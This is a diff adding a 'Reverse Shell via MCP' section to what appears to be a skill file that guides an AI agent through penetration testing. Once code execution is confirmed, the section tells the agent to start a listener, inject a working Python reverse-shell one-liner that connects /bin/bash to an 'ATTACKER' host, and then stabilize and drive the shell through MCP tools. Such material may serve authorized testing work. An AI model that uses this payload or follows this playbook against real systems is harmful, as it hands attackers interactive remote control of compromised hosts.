@@ -587,6 +587,23 @@ curl -s -X POST http://TARGET/endpoint \
 
 ## Step 6: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When RCE is confirmed, **prefer catching a reverse shell via the MCP
+shell-server** over continuing to inject Python code through the vulnerable
+parameter.
+
+1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
+2. Send a reverse shell payload through the injection point:
+   ```python
+   __import__('os').system('python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'')
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Use `send_command()` for all subsequent commands
+
+If the target lacks outbound connectivity, continue with inline command
+execution and note the limitation in state.md.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
